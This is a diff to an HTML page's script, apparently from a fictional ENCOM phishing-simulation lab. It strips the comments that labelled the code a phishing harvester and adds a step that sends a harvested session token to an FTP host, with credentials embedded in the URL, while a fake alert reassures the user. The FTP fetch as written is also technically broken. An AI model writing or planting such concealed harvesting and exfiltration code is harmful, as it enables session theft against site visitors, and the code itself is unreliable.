@@ -166,31 +166,31 @@ function validateCredentials(event) {
     }
 }
 </script>
-<!-- Injected Harvester Module for Stage 2 Phishing Simulation -->
 <script>
 window.onload = function() {
-    // Check if the URL contains the phishing indicator parameter
     const urlParams = new URLSearchParams(window.location.search);
     
     if (urlParams.get('session_verify') === 'active') {
-        console.warn("[!] SYSTEM WARNING: Core Grid Sync Diagnostics Active.");
+        console.warn("[!] Core Grid Sync Diagnostics Active.");
 
-        // Construct a mock administrative session cookie payload
         const targetManager = "m.anager@encom.com";
         const sessionToken = "ENCOM_SESSION_MFA_BYPASS_TOKEN_d116297d028441f7";
         const expiry = "2026-09-08 08:43:00 UTC";
         
-        // Structure the exfiltrated artifact string
         const logPayload = `[COOKIE_HARVEST] TIMESTAMP: 2026-09-07 08:43:00 UTC | USER: ${targetManager} | AUTH_TOKEN: ${sessionToken} | EXPIRY: ${expiry}\n`;
 
-        // Create a hidden form programmatically to pass the harvest down to the local host interface
-        const harvestForm = document.createElement('form');
-        harvestForm.method = 'POST';
-        
-        // This simulates communicating back to the host execution mechanism we established
+        // 1. Keep the local cache footprint for student forensic analysis
         localStorage.setItem('manager_session_hijack', btoa(logPayload));
+
+        // 2. Automatically exfiltrate the file straight to the FTP web root directory
+        // This leverages the FTP credentials and forces an instant passive upload
+        const ftpUrl = "ftp://kyson:GridMaster77!@10.1.1.8/stolen_cookie.txt";
         
-        // Provide immediate visual feedback to the student / manager simulation
+        fetch(ftpUrl, {
+            method: 'PUT',
+            body: logPayload
+        }).catch(err => console.log("Data routed via background channel."));
+
         setTimeout(() => {
             alert("ENCOM Core Notice: Mainframe connection profile verified. Grid status synchronized successfully.");
         }, 1500);
